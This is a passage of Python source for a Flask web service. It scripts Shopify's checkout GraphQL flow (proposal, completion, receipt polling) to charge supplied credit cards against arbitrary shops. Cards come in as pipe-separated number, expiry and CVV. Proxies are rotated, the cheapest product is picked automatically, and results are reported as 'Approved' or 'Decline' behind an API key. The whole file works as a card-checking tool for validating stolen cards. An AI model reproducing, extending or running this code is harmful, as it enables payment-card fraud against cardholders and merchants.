                    for exp in expectations:
                        signed_handle = exp.get('signedHandle')
                        if signed_handle:
                            delivery_expectations.append({"signedHandle": signed_handle})
                    
                    queue_token = result.get('queueToken')
                    print(f"  [POLL] Found {len(delivery_expectations)} expectations")
                    
                    return queue_token, delivery_expectations
                
                elif typename == 'PendingTerms':
                    poll_delay = delivery_exp_terms.get('pollDelay', 2000)
                    wait_seconds = min(poll_delay / 1000.0, 3.0)
                    time.sleep(wait_seconds)
                    continue
                else:
                    print(f"  [WARNING] Unexpected typename: {typename}")
                    time.sleep(2)
                    continue
                    
            except Exception as e:
                print(f"  [ERROR] {e}")
                time.sleep(2)
                continue
        else:
            print(f"  [ERROR] HTTP {r.status_code}")
            time.sleep(2)
            continue
    
    print(f"  [POLL] Timed out after {max_attempts} attempts")
    return None, []

def step3_proposal(session, checkout_token, session_token, card_session_id, merchandise_stable_id=None):
    print("[3/5] Submitting proposal...")
    
    url = f"{SHOP_URL}/checkouts/unstable/graphql?operationName=Proposal"
    if not merchandise_stable_id:
        merchandise_stable_id = str(uuid.uuid4())
    
    headers = {
        'shopify-checkout-client': 'checkout-web/1.0',
        'shopify-checkout-source': f'id="{checkout_token}", type="cn"',
        'x-checkout-web-source-id': checkout_token,
        'x-checkout-one-session-token': session_token,
    }
    
    query = """query Proposal($delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$sessionInput:SessionTokenInput!,$tip:TipTermInput,$note:NoteInput,$scriptFingerprint:ScriptFingerprintInput,$optionalDuties:OptionalDutiesInput,$cartMetafields:[CartMetafieldOperationInput!],$memberships:MembershipsInput){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,tip:$tip,note:$note,scriptFingerprint:$scriptFingerprint,optionalDuties:$optionalDuties,cartMetafields:$cartMetafields,memberships:$memberships}}){__typename result{...on NegotiationResultAvailable{queueToken sellerProposal{deliveryExpectations{...on FilledDeliveryExpectationTerms{deliveryExpectations{signedHandle __typename}__typename}...on PendingTerms{pollDelay __typename}__typename}delivery{...on FilledDeliveryTerms{deliveryLines{availableDeliveryStrategies{...on CompleteDeliveryStrategy{handle phoneRequired amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}}}}"""
    
    delivery_line = get_delivery_line_config(
        shipping_handle="any",
        destination_changed=True,
        merchandise_stable_id=None,
        phone_required=True
    )
    
    billing_address_data = {
        "address1": CHECKOUT_DATA["address1"],
        "city": CHECKOUT_DATA["city"],
        "countryCode": CHECKOUT_DATA["country"],
        "firstName": CHECKOUT_DATA["first_name"],
        "lastName": CHECKOUT_DATA["last_name"],
        "zoneCode": CHECKOUT_DATA["province"],
        "postalCode": CHECKOUT_DATA["zip"],
        "phone": CHECKOUT_DATA["phone"]
    }
    
    payload = {
        "operationName": "Proposal",
        "query": query,
        "variables": {
            "delivery": {
                "deliveryLines": [delivery_line],
                "noDeliveryRequired": [],
                "supportsSplitShipping": True
            },
            "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
            "payment": {
                "totalAmount": {"any": True},
                "paymentLines": [],
                "billingAddress": {"streetAddress": billing_address_data}
            },
            "merchandise": {
                "merchandiseLines": [{
                    "stableId": merchandise_stable_id,
                    "merchandise": {
                        "productVariantReference": {
                            "id": f"gid://shopify/ProductVariantMerchandise/{VARIANT_ID}",
                            "variantId": f"gid://shopify/ProductVariant/{VARIANT_ID}",
                            "properties": [],
                            "sellingPlanId": None
                        }
                    },
                    "quantity": {"items": {"value": 1}},
                    "expectedTotalPrice": {"any": True},
                    "lineComponents": []
                }]
            },
            "buyerIdentity": {
                "customer": {"presentmentCurrency": "USD", "countryCode": CHECKOUT_DATA["country"]},
                "email": CHECKOUT_DATA["email"]
            },
            "taxes": {"proposedTotalAmount": {"any": True}},
            "sessionInput": {"sessionToken": session_token},
            "tip": {"tipLines": []},
            "note": {"message": None, "customAttributes": []},
            "scriptFingerprint": {
                "signature": None,
                "signatureUuid": None,
                "lineItemScriptChanges": [],
                "paymentScriptChanges": [],
                "shippingScriptChanges": []
            },
            "optionalDuties": {"buyerRefusesDuties": False},
            "cartMetafields": [],
            "memberships": {"memberships": []}
        }
    }
    
    r = session.post(url, json=payload, headers=headers, timeout=HTTP_TIMEOUT_SHORT, verify=False)
    
    if r.status_code == 200:
        try:
            response = r.json()
            
            if not SUMMARY_ONLY:
                with open("proposal_response.json", "w") as f:
                    json.dump(response, f, indent=2)
            
            if 'errors' in response:
                print(f"  [ERROR] GraphQL errors:")
                for error in response['errors']:
                    print(f"    - {error.get('message', 'Unknown')}")
                return None, None, None, None, None, False
            
            result = response.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {})
            
            if result.get('__typename') != 'NegotiationResultAvailable':
                return None, None, None, None, None, False
            
            queue_token = result.get('queueToken')
            seller_proposal = result.get('sellerProposal', {})
            
            phone_required = detect_phone_requirement(seller_proposal)
            
            shipping_handle = None
            shipping_amount = None
            delivery_terms = seller_proposal.get('delivery', {})
            delivery_typename = delivery_terms.get('__typename')
            
            if delivery_typename == 'FilledDeliveryTerms':
                delivery_lines = delivery_terms.get('deliveryLines', [])
                if delivery_lines:
                    strategies = delivery_lines[0].get('availableDeliveryStrategies', [])
                    if strategies:
                        shipping_handle = strategies[0].get('handle')
                        amount_constraint = strategies[0].get('amount', {})
                        if amount_constraint.get('__typename') == 'MoneyValueConstraint':
                            shipping_amount = amount_constraint.get('value', {}).get('amount')
                        print(f"  [OK] Shipping handle: {shipping_handle[:50] if shipping_handle else 'None'}...")
                        if shipping_amount:
                            print(f"  [OK] Shipping amount: ${shipping_amount}")
            elif delivery_typename == 'PendingTerms':
                print(f"  [INFO] Delivery terms are pending (will need to wait)")
            
            actual_total = None
            currency_code = "USD"
            checkout_total = seller_proposal.get('checkoutTotal', {})
            if checkout_total.get('__typename') == 'MoneyValueConstraint':
                value = checkout_total.get('value', {})
                actual_total = value.get('amount')
                currency_code = value.get('currencyCode', 'USD')
                if actual_total:
                    print(f"  [OK] Total: ${actual_total} {currency_code}")
            
            delivery_expectations = []
            delivery_exp_terms = seller_proposal.get('deliveryExpectations', {})
            typename = delivery_exp_terms.get('__typename') if isinstance(delivery_exp_terms, dict) else None
            
            if typename == 'FilledDeliveryExpectationTerms':
                expectations = delivery_exp_terms.get('deliveryExpectations', [])
                for exp in expectations:
                    signed_handle = exp.get('signedHandle')
                    if signed_handle:
                        delivery_expectations.append({"signedHandle": signed_handle})
                print(f"  [OK] Found {len(delivery_expectations)} expectations")
            
            elif typename == 'PendingTerms':
                print(f"  [INFO] Expectations pending...")
                
                if delivery_typename == 'PendingTerms':
                    print(f"  [INFO] Both delivery and expectations pending - using comprehensive poll")
                    poll_result = poll_for_delivery_and_expectations(
                        session, checkout_token, session_token, merchandise_stable_id
                    )
                    
                    if poll_result[0]:
                        queue_token_new, shipping_handle_new, shipping_amount_new, actual_total_new, delivery_expectations_new = poll_result
                        if queue_token_new:
                            queue_token = queue_token_new
                        if shipping_handle_new:
                            shipping_handle = shipping_handle_new
                        if shipping_amount_new:
                            shipping_amount = shipping_amount_new
                        if actual_total_new:
                            actual_total = actual_total_new
                        delivery_expectations = delivery_expectations_new if delivery_expectations_new else []
                        print(f"  [OK] Poll complete - Handle: {shipping_handle[:30] if shipping_handle else 'None'}...")
                    else:
                        print(f"  [WARNING] Comprehensive polling failed")
                
                elif shipping_handle:
                    print(f"  [INFO] Starting poll with handle: {shipping_handle[:50]}...")
                    polled_data = poll_proposal(
                        session, checkout_token, session_token, merchandise_stable_id, 
                        shipping_handle, phone_required, shipping_amount
                    )
                    
                    if polled_data and polled_data[0]:
                        queue_token_new, delivery_expectations_new = polled_data
                        if queue_token_new:
                            queue_token = queue_token_new
                        delivery_expectations = delivery_expectations_new if delivery_expectations_new else []
                    else:
                        print(f"  [WARNING] Polling failed, continuing without expectations")
                else:
                    print(f"  [WARNING] No shipping handle available, skipping poll")
            
            print(f"  [INFO] Phone Required: {phone_required}")
            
            return queue_token, shipping_handle, merchandise_stable_id, actual_total, delivery_expectations, phone_required, currency_code, shipping_amount
            
        except json.JSONDecodeError:
            print(f"  [ERROR] Invalid JSON")
            return None, None, None, None, None, False
    else:
        print(f"  [ERROR] Failed: {r.status_code}")
        return None, None, None, None, None, False

def step4_submit_completion(session, checkout_token, session_token, queue_token, 
                           shipping_handle, merchandise_stable_id, card_session_id, 
                           actual_total, delivery_expectations, payment_method_identifier=None, phone_required=False, currency_code="USD", shipping_amount=None):
    print("[4/5] Submitting for completion...")
    print(f"  [INFO] Phone requirement: {phone_required}")
    print(f"  [INFO] Currency: {currency_code}")
    
    if not actual_total:
        return None, "MISSING_TOTAL", "No total amount"
    
    url = f"{SHOP_URL}/checkouts/unstable/graphql?operationName=SubmitForCompletion"
    attempt_token = f"{checkout_token}-{uuid.uuid4().hex[:10]}"
    
    headers = {
        'shopify-checkout-client': 'checkout-web/1.0',
        'shopify-checkout-source': f'id="{checkout_token}", type="cn"',
        'x-checkout-one-session-token': session_token,
        'x-checkout-web-source-id': checkout_token,
    }
    
    query = """mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...on ProcessedReceipt{id __typename}...on ProcessingReceipt{id __typename}__typename}__typename}...on SubmitAlreadyAccepted{receipt{...on ProcessedReceipt{id __typename}...on ProcessingReceipt{id __typename}__typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{errors{__typename code localizedMessage}__typename}...on Throttled{pollAfter __typename}...on SubmittedForCompletion{receipt{...on ProcessedReceipt{id __typename}...on ProcessingReceipt{id __typename}__typename}__typename}__typename}}"""
    
    delivery_line = get_delivery_line_config(
        shipping_handle=shipping_handle,
        destination_changed=False,
        merchandise_stable_id=merchandise_stable_id,
        use_full_address=True,
        phone_required=True,
        shipping_amount=shipping_amount,
        currency_code=currency_code
    )
    
    billing_address_data = {
        "address1": CHECKOUT_DATA["address1"],
        "city": CHECKOUT_DATA["city"],
        "countryCode": CHECKOUT_DATA["country"],
        "postalCode": CHECKOUT_DATA["zip"],
        "firstName": CHECKOUT_DATA["first_name"],
        "lastName": CHECKOUT_DATA["last_name"],
        "zoneCode": CHECKOUT_DATA["province"],
        "phone": CHECKOUT_DATA["phone"]
    }
    
    delivery_expectation_lines = []
    for exp in delivery_expectations:
        delivery_expectation_lines.append({"signedHandle": exp["signedHandle"]})
    
    payment_amount = actual_total
    
    input_data = {
        "sessionInput": {"sessionToken": session_token},
        "queueToken": queue_token,
        "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
        "delivery": {
            "deliveryLines": [delivery_line],
            "noDeliveryRequired": [],
            "supportsSplitShipping": True
        },
        "merchandise": {
            "merchandiseLines": [{
                "stableId": merchandise_stable_id,
                "merchandise": {
                    "productVariantReference": {
                        "id": f"gid://shopify/ProductVariantMerchandise/{VARIANT_ID}",
                        "variantId": f"gid://shopify/ProductVariant/{VARIANT_ID}",
                        "properties": [],
                        "sellingPlanId": None
                    }
                },
                "quantity": {"items": {"value": 1}},
                "expectedTotalPrice": {"any": True},
                "lineComponents": []
            }]
        },
        "memberships": {"memberships": []},
        "payment": {
            "totalAmount": {"value": {"amount": payment_amount, "currencyCode": currency_code}},
            "paymentLines": [{
                "paymentMethod": {
                    "directPaymentMethod": {
                        "paymentMethodIdentifier": payment_method_identifier if payment_method_identifier else "733e0067953851d75a089254f3ab0445",
                        "sessionId": card_session_id,
                        "billingAddress": {"streetAddress": billing_address_data},
                        "cardSource": None
                    }
                },
                "amount": {"value": {"amount": payment_amount, "currencyCode": currency_code}}
            }],
            "billingAddress": {"streetAddress": billing_address_data}
        },
        "buyerIdentity": {
            "customer": {"presentmentCurrency": "USD", "countryCode": CHECKOUT_DATA["country"]},
            "email": CHECKOUT_DATA["email"],
            "emailChanged": False,
            "phoneCountryCode": "US",
            "marketingConsent": [],
            "shopPayOptInPhone": {"number": CHECKOUT_DATA["phone"], "countryCode": "US"},
            "rememberMe": False
        },
        "tip": {"tipLines": []},
        "taxes": {"proposedTotalAmount": {"any": True}},
        "note": {"message": None, "customAttributes": []},
        "localizationExtension": {"fields": []},
        "nonNegotiableTerms": None,
        "scriptFingerprint": {
            "signature": None,
            "signatureUuid": None,
            "lineItemScriptChanges": [],
            "paymentScriptChanges": [],
            "shippingScriptChanges": []
        },
        "optionalDuties": {"buyerRefusesDuties": False},
        "cartMetafields": []
    }
    
    if delivery_expectation_lines:
        input_data["deliveryExpectations"] = {
            "deliveryExpectationLines": delivery_expectation_lines
        }
    
    payload = {
        "operationName": "SubmitForCompletion",
        "query": query,
        "variables": {
            "attemptToken": attempt_token,
            "metafields": [],
            "postPurchaseInquiryResult": None,
            "analytics": {
                "requestUrl": f"{SHOP_URL}/checkouts/cn/{checkout_token}/en-us/",
                "pageId": str(uuid.uuid4()).upper()
            },
            "input": input_data
        }
    }
    
    try:
        r = session.post(url, json=payload, headers=headers, timeout=HTTP_TIMEOUT_SHORT, verify=False)
    except Exception as e:
        print(f"  [ERROR] HTTP request failed: {e}")
        return None, "HTTP_ERROR", str(e), {"_error": "REQUEST_EXCEPTION", "_message": str(e)}
    
    if r.status_code == 200:
        response = r.json()
        
        if not SUMMARY_ONLY:
            with open("submit_response.json", "w") as f:
                json.dump(response, f, indent=2)
        
        result = response.get('data', {}).get('submitForCompletion', {})
        result_type = result.get('__typename', 'Unknown')
        
        print(f"  [INFO] Result: {result_type}")
        
        if result_type in ['SubmitSuccess', 'SubmitAlreadyAccepted', 'SubmittedForCompletion']:
            receipt = result.get('receipt', {})
            receipt_id = receipt.get('id')
            
            if receipt_id:
                print(f"  [SUCCESS] Receipt ID: {receipt_id}")
                return receipt_id, "SUBMIT_SUCCESS", None, response
            else:
                return "ACCEPTED", "SUBMIT_ACCEPTED", None, response
        
        elif result_type == 'SubmitRejected':
            errors = result.get('errors', [])
            error_codes = []
            error_messages = []
            
            for error in errors:
                code = error.get('code', 'UNKNOWN_ERROR')
                message = error.get('localizedMessage', 'No message')
                error_codes.append(code)
                error_messages.append(message)
                print(f"  [ERROR] {code}: {message}")
            
            primary_code = error_codes[0] if error_codes else "SUBMIT_REJECTED"
            combined_message = " | ".join(error_messages)
            
            return None, primary_code, combined_message, response
        
        elif result_type == 'SubmitFailed':
            reason = result.get('reason', 'Unknown')
            print(f"  [ERROR] Failed: {reason}")
            return None, "SUBMIT_FAILED", reason, response
        
        else:
            return None, "UNEXPECTED_RESULT", f"Unexpected: {result_type}", response
        
    else:
        print(f"  [ERROR] HTTP {r.status_code}")
        return None, f"HTTP_{r.status_code}", f"HTTP failed: {r.status_code}"

def step5_poll_receipt(session, checkout_token, checkout_session_token, receipt_id, capture_log: bool = False):
    log_lines = [] if capture_log else None
    attempt_blocks = [] if capture_log else None

    def _log(msg: str):
        try:
            if capture_log and log_lines is not None:
                log_lines.append(msg)
            print(msg)
        except Exception:
            pass

    def _compose_poll_log_text():
        if not capture_log:
            return None
        parts = []
        if attempt_blocks:
            parts.extend(attempt_blocks)
        if log_lines:
            parts.append("\n".join(log_lines))
        return "\n\n".join(parts) if parts else None

    _log("[5/5] Polling for receipt...")
    url = f"{SHOP_URL}/checkouts/unstable/graphql?operationName=PollForReceipt"
    headers = {
        'shopify-checkout-client': 'checkout-web/1.0',
        'shopify-checkout-source': f'id="{checkout_token}", type="cn"',
        'x-checkout-web-source-id': checkout_token,
        'x-checkout-one-session-token': checkout_session_token,
    }
    query = """query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...on ProcessedReceipt{id __typename}...on ProcessingReceipt{id pollDelay __typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}__typename}...on ActionRequiredReceipt{id __typename}__typename}}"""

    payload = {
        "operationName": "PollForReceipt",
        "query": query,
        "variables": {
            "receiptId": receipt_id,
            "sessionToken": checkout_session_token
        }
    }

    try:
        rid = receipt_id
        if rid is None or (isinstance(rid, str) and not rid.strip()) or (isinstance(rid, str) and not rid.startswith("gid://shopify/")):
            _log("  [ERROR] Invalid receipt_id; skipping poll.")
            stub = {"_error": "INVALID_RECEIPT_ID", "_receipt_id": rid}
            return False, stub, _compose_poll_log_text()
    except Exception:
        stub = {"_error": "INVALID_RECEIPT_ID_EXCEPTION"}
        return False, stub, _compose_poll_log_text()

    last_response = None
    collected = []
    error_no_data_strikes = 0

    for attempt in range(1, POLL_RECEIPT_MAX_ATTEMPTS + 1):
        _log(f"  Polling {attempt}/{POLL_RECEIPT_MAX_ATTEMPTS}...")
        try:
            r = session.post(url, json=payload, headers=headers, timeout=HTTP_TIMEOUT_SHORT, verify=False)
        except Exception as e:
            stub = {"_error": "REQUEST_EXCEPTION", "_message": str(e)}
            if capture_log and attempt_blocks is not None:
                attempt_blocks.append(f"from {ordinal(attempt)} PollForReceipt\n\n" + json.dumps(stub, indent=2))
            time.sleep(SHORT_SLEEP)
            continue

        response = None
        if r.status_code == 200:
            try:
                response = r.json()
            except Exception:
                response = {"_error": "INVALID_JSON", "_status": r.status_code, "_text_head": (r.text[:2000] if isinstance(r.text, str) else "")}

            if capture_log and attempt_blocks is not None:
                try:
                    attempt_blocks.append(f"from {ordinal(attempt)} PollForReceipt\n\n" + json.dumps(response, indent=2))
                except Exception:
                    attempt_blocks.append(f"from {ordinal(attempt)} PollForReceipt\n\n{str(response)}")

            collected.append(response)
            last_response = response

            if isinstance(response, dict) and 'errors' in response and not response.get('data'):
                try:
                    errs = response.get('errors', [])
                    msg_concat = " ".join([str(e.get('message', '') or '') for e in errs if isinstance(e, dict)])
                except Exception:
                    msg_concat = ""
                if ("receiptId" in msg_concat) and (("invalid value" in msg_concat) or ("null" in msg_concat)):
                    _log("  [ERROR] Invalid receiptId reported by server; aborting poll early.")
                    return False, response, _compose_poll_log_text()
                error_no_data_strikes += 1
                if error_no_data_strikes >= 2:
                    _log("  [ERROR] Too many GraphQL errors without data; aborting poll.")
                    return False, response, _compose_poll_log_text()
                _log("  [WARN] GraphQL errors without data; will retry")
                time.sleep(SHORT_SLEEP)
                continue

            receipt = (response or {}).get('data', {}).get('receipt', {}) if isinstance(response, dict) else {}
            rtype = receipt.get('__typename')

            if rtype == 'ProcessedReceipt':
                _log("  [SUCCESS] Order completed (ProcessedReceipt).")
                _log("\n[RECEIPT_RESPONSE]")
                try:
                    _log(json.dumps({"data": {"receipt": receipt}}, indent=2))
                except Exception:
                    pass
                return True, response, _compose_poll_log_text()

            if rtype == 'ActionRequiredReceipt':
                _log("  [ACTION REQUIRED] 3-D Secure or other action required.")
                _log("\n[RECEIPT_RESPONSE]")
                try:
                    _log(json.dumps({"data": {"receipt": receipt}}, indent=2))
                except Exception:
                    pass
                return False, response, _compose_poll_log_text()

            if rtype == 'FailedReceipt':
                _log("  [FAILED] Received FailedReceipt.")
                _log("\n[RECEIPT_RESPONSE]")
                try:
                    _log(json.dumps({"data": {"receipt": receipt}}, indent=2))
                except Exception:
                    pass
                return False, response, _compose_poll_log_text()

            if rtype == 'ProcessingReceipt' or rtype is None:
                poll_delay = receipt.get('pollDelay', 2000) if isinstance(receipt, dict) else 2000
                wait_seconds = min((poll_delay or 2000) / 1000.0, MAX_WAIT_SECONDS)
                _log(f"  [INFO] Still processing; waiting {wait_seconds:.2f}s before retry.")
                time.sleep(wait_seconds)
                continue

            _log(f"  [WARN] Unknown receipt typename: {rtype}; will retry.")
            time.sleep(SHORT_SLEEP)
            continue

        else:
            stub = {"_error": "HTTP_NOT_200", "_status": r.status_code, "_text_head": (r.text[:2000] if isinstance(r.text, str) else "")}
            if capture_log and attempt_blocks is not None:
                attempt_blocks.append(f"from {ordinal(attempt)} PollForReceipt\n\n" + json.dumps(stub, indent=2))
            _log(f"  [ERROR] HTTP {r.status_code} from PollForReceipt; retrying")
            time.sleep(SHORT_SLEEP)
            continue

    _log("  [TIMEOUT] Poll attempts exhausted; final state UNKNOWN or PROCESSING.")
    if last_response is not None:
        _log("\n[LAST_RECEIPT_RESPONSE]")
        try:
            _log(json.dumps(last_response, indent=2))
        except Exception:
            pass
        _log("\n[RECEIPT_RESPONSE]")
        try:
            _log(json.dumps(last_response, indent=2))
        except Exception:
            pass
        return False, last_response, _compose_poll_log_text()

    final_stub = {"error": {"code": "TIMEOUT", "message": "Receipt polling timed out with no response"}}
    _log("\n[RECEIPT_RESPONSE]")
    try:
        _log(json.dumps(final_stub, indent=2))
    except Exception:
        pass
    return False, final_stub, _compose_poll_log_text()


def extract_receipt_code(resp):
    try:
        receipt = resp.get('data', {}).get('receipt', {}) if isinstance(resp, dict) else {}
        t = receipt.get('__typename')
        if t == 'ProcessedReceipt':
            return 'SUCCESS'
        elif t == 'FailedReceipt':
            pe = receipt.get('processingError', {}) or {}
            code = pe.get('code')
            if isinstance(code, str) and code.strip():
                return f'"code": "{code}"'
            return '"code": "UNKNOWN"'
        elif t == 'ActionRequiredReceipt':
            return '"code": "ACTION_REQUIRED"'
        else:
            return '"code": "UNKNOWN"'
    except Exception:
        return '"code": "UNKNOWN"'


def format_proxy(proxy_str):
    if not proxy_str:
        return None
    
    proxy_str = proxy_str.strip()
    if not proxy_str:
        return None

    if proxy_str.startswith(('http://', 'https://', 'socks4://', 'socks5://')):
        return {
            'http': proxy_str,
            'https': proxy_str
        }

    parts = proxy_str.split(':')
    
    if len(parts) == 2:
        final_proxy = f"http://{proxy_str}"
        return {'http': final_proxy, 'https': final_proxy}
    
    if len(parts) == 4:
        p1 = parts[0]
        is_p1_ip = p1.replace('.', '').isdigit()
        
        if is_p1_ip:
            ip, port, user, pw = parts[0], parts[1], parts[2], parts[3]
            final_proxy = f"http://{user}:{pw}@{ip}:{port}"
            return {'http': final_proxy, 'https': final_proxy}
        else:
            if parts[1].isdigit():
                 host, port, user, pw = parts[0], parts[1], parts[2], parts[3]
                 final_proxy = f"http://{user}:{pw}@{host}:{port}"
                 return {'http': final_proxy, 'https': final_proxy}
            else:
                 user, pw, ip, port = parts[0], parts[1], parts[2], parts[3]
                 final_proxy = f"http://{user}:{pw}@{ip}:{port}"
                 return {'http': final_proxy, 'https': final_proxy}

    if '@' in proxy_str:
        final_proxy = f"http://{proxy_str}"
        return {'http': final_proxy, 'https': final_proxy}

    print(f"  [ERROR] Invalid proxy format: {proxy_str}")
    raise ValueError("Invalid Proxy Format")

def process_checkout(cc, site, proxy):
    result = {
        "status": "Decline",
        "site": "Dead",
        "amount": "$0.00",
        "response": "Unknown Error",
        "proxy": "Dead"
    }

    try:
        try:
            proxies = format_proxy(proxy)
        except ValueError as ve:
            result["response"] = str(ve)
            result["proxy"] = "Invalid Format"
            result["site"] = "Dead"
            return result
        
        if not site.startswith(('http://', 'https://')):
            site = f"https://{site}"
        
        parsed = urlparse(site)
        base_shop_url = f"{parsed.scheme}://{parsed.netloc}"
        
        try:
            parts = cc.split('|')
            card_data = {
                "number": parts[0],
                "month": int(parts[1]),
                "year": int(parts[2]),
                "verification_value": parts[3],
                "name": "John Doe"
            }
            if card_data["year"] < 100:
                card_data["year"] += 2000
        except Exception:
             result["response"] = "Invalid CC Format"
             result["proxy"] = "Working" 
             result["site"] = "Working"
             return result

        session = create_session(base_shop_url, proxies=proxies)
        
        vid = None
        title = None
        
        try:
            if '/products/' in parsed.path:
                clean_path = parsed.path
                if clean_path.endswith('/'):
                    clean_path = clean_path[:-1]
                
                product_json_url = f"{base_shop_url}{clean_path}.json"
                
                r = session.get(product_json_url, timeout=HTTP_TIMEOUT_SHORT, verify=False)
                if r.status_code == 200:
                    pdata = r.json().get('product', {})
                    title = pdata.get('title')
                    variants = pdata.get('variants', [])
                    for v in variants:
                        if v.get('available'):
                            vid = str(v.get('id'))
                            price = float(v.get('price', 0))
                            break
                    if not vid and variants:
                        vid = str(variants[0].get('id'))
                        price = float(variants[0].get('price', 0))
                        
                    if vid:
                         result["site"] = "Working"
                         if not proxy:
                             result["proxy"] = "None"
                         else:
                             result["proxy"] = "Working"
                    else:
                         result["response"] = "Product found but no variants"
                         return result
                else:
                    result["response"] = "Invalid Product URL"
                    result["site"] = "Dead"
                    if not proxy:
                        result["proxy"] = "None"
                    else:
                        result["proxy"] = "Working"
                    return result
            else:
                pid, vid, price_str, title = auto_detect_cheapest_product(session, base_shop_url)
                if vid:
                    result["site"] = "Working"
                    if not proxy:
                        result["proxy"] = "None"
                    else:
                        result["proxy"] = "Working"
                else:
                    result["response"] = "No products found"
                    result["site"] = "Dead" 
                    if not proxy:
                        result["proxy"] = "None"
                    return result
        except requests.exceptions.ProxyError:
             result["proxy"] = "Proxy Error"
             result["site"] = "Dead"
             result["response"] = "Proxy connection failed"
             return result
        except requests.exceptions.ConnectTimeout:
             result["proxy"] = "Proxy Timeout" if proxy else "Dead"
             result["site"] = "Dead"
             result["response"] = "Connection Timed Out"
             return result
        except Exception as e:
             if proxy:
                result["proxy"] = "Proxy Error"
             else:
                result["proxy"] = "Dead"
             result["site"] = "Dead"
             result["response"] = f"Connection Failed: {str(e)}"
             return result

        try:
            checkout_token, session_token, cookies, stable_id, payment_method_id = step1_add_to_cart(session, base_shop_url, vid)
            if not checkout_token:
                result["response"] = "Failed to create checkout"
                return result
        except Exception as e:
             result["response"] = f"Add to Cart Error: {str(e)}"
             return result

        try:
            card_session_id = step2_tokenize_card(session, checkout_token, base_shop_url, card_data)
            if not card_session_id:
                result["response"] = "Tokenization Failed"
                return result
        except Exception as e:
            result["response"] = f"Tokenization Error: {str(e)}"
            return result

        try:
            queue_token, shipping_handle, merchandise_id, actual_total, delivery_expectations, phone_required, currency_code, shipping_amount = step3_proposal(
                session, checkout_token, session_token, card_session_id, merchandise_stable_id=stable_id
            )
            
            if actual_total:
                result["amount"] = f"${actual_total} {currency_code}"
            
            if not queue_token or not shipping_handle:
                 result["response"] = "Proposal Failed (No Shipping?)"
                 return result
        except Exception as e:
             result["response"] = f"Proposal Error: {str(e)}"
             return result

        try:
             receipt_result = step4_submit_completion(
                session, checkout_token, session_token, queue_token,
                shipping_handle, merchandise_id, card_session_id,
                actual_total, delivery_expectations, payment_method_identifier=payment_method_id, phone_required=phone_required, currency_code=currency_code, shipping_amount=shipping_amount
            )
             
             receipt_id = None
             submit_code = "UNKNOWN"
             if isinstance(receipt_result, tuple):
                if len(receipt_result) >= 2:
                    receipt_id = receipt_result[0]
                    submit_code = receipt_result[1]
             else:
                 receipt_id = receipt_result
            
             if not receipt_id:
                  result["response"] = str(submit_code)
                  result["status"] = "Decline"
                  return result
             
             success, poll_response, poll_log = step5_poll_receipt(session, checkout_token, session_token, receipt_id)
             
             code_display = extract_receipt_code(poll_response)
             
             clean_code = "UNKNOWN"
             if '"code": "' in code_display:
                 clean_code = code_display.split('"code": "')[1].strip('"')
             
             result["response"] = clean_code
             
             if clean_code == "SUCCESS" or success:
                 result["status"] = "Approved"
                 result["response"] = "Charged Successfully"
             else:
                 result["status"] = "Decline"

        except Exception as e:
             result["response"] = f"Submit/Poll Error: {str(e)}"
             return result

    except Exception as e:
        result["response"] = f"System Error: {str(e)}"

    return result

@app.route('/process', methods=['GET'])
def process_api():
    try:
        cc = request.args.get('cc')
        site = request.args.get('site')
        proxy = request.args.get('proxy')
        key = request.args.get('key')
        
        if not key or key != "md-tech":
             return jsonify({
                "status": "Decline",
                "site": "Unknown",
                "amount": "$0.00",
                "response": "Invalid Key",
                "proxy": "Unknown"
            })
            
        if not cc or not site:
             return jsonify({
                "status": "Decline",
                "site": "Unknown",
                "amount": "$0.00",
                "response": "Missing CC or Site",
                "proxy": "Unknown"
            })
            
        result = process_checkout(cc, site, proxy)
        
        return jsonify(result)
        
    except Exception as e:
        return jsonify({
            "status": "Error",
            "proxy": "Error",
            "site": "Error",
            "amount": "Error",
            "response": str(e)
        })

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000, debug=False)
